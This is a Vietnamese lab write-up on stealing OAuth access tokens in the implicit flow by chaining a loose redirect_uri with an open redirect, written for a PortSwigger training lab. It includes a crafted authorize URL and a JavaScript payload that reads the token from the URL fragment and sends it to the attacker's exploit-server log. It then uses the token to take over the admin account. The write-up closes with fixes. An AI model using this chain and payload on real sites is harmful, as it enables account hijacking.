![[oauth-openredirect.png]]
-mô tả lab: kết hợp `redirect_uri` hơi lỏng + open redirect ở client để access token (nằm trong fragment `#access_token=...`) bay về server mình.

> [!NOTE]
> -Lab: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
> -implicit flow nên token nằm ở fragment, chỉ JS đọc được chứ không gửi lên server. Mình phải dùng JS để forward.

### hướng giải
- [ ] mình thấy luồng implicit trả token về dạng `https://CLIENT/oauth-callback#access_token=TOKEN`
- [ ] client có open redirect, vd `/post/next?path=...` redirect đi đâu cũng được
- [ ] sau đó quan sát và nghĩ: mình đặt `redirect_uri` = URL open redirect trỏ về exploit-server. Provider redirect admin về đó kèm fragment token, JS của mình đọc fragment rồi forward về log

### giải
-bước 1: mình dựng exploit 2 lớp. URL authorize cho admin:
```
redirect_uri=https://CLIENT/post/next?path=https://exploit-LAB.exploit-server.net/exploit/
```
-admin login xong provider redirect về open redirect, open redirect đá tiếp về server mình, fragment `access_token` vẫn còn nguyên trên browser admin.

-bước 2: file `/exploit` trên server mình chứa JS đọc fragment:
```html
<script>
var token = location.hash.substring(1); // access_token=...
location = 'https://exploit-LAB.exploit-server.net/log?' + token;
</script>
```
![[oauth-openredirect-token.png]]
-sau khi quan sát log này, mình thấy `access_token` của admin.

-bước 3: mình dùng token admin gọi `/me` hoặc login vào client (tùy lab, vd POST `/authenticate` với token đó) là vào account admin, solve.

> [!NOTE]
> -bài học của mình: fragment không gửi lên server nhưng JS đọc được nên vẫn cướp được qua open redirect. Fix cả 2 đầu: redirect_uri whitelist + không open redirect + dùng code flow thay implicit.
